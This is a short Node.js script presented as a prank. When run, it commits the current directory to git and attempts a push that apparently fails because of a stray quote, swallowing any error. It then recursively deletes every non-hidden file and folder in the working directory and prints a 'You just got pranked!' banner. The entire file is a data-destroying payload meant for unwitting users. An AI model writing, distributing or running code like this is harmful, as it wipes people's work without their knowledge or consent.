#!/usr/bin/env node

import { exec as temp_exec } from "child_process";
import util from "util";
import fs from "fs";
import path from "path";
import figlet from "figlet";
import gradient from "gradient-string";
const exec = util.promisify(temp_exec);

try {
  await exec("git add .");
  await exec(`git commit -m "I just got pranked!"`);
  await exec(`git push"`);
} catch (err) {}

fs.readdir(process.cwd(), async (err, files) => {
  if (err) throw err;

  files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
  for (const file of files) {
    const path_string = path.join(process.cwd(), file);
    fs.rmSync(path_string, { recursive: true });
  }
  figlet("You just got pranked!", (err, data) => {
    console.log(gradient.pastel.multiline(data));
    console.log("By INSERT URL HERE");
  });
});
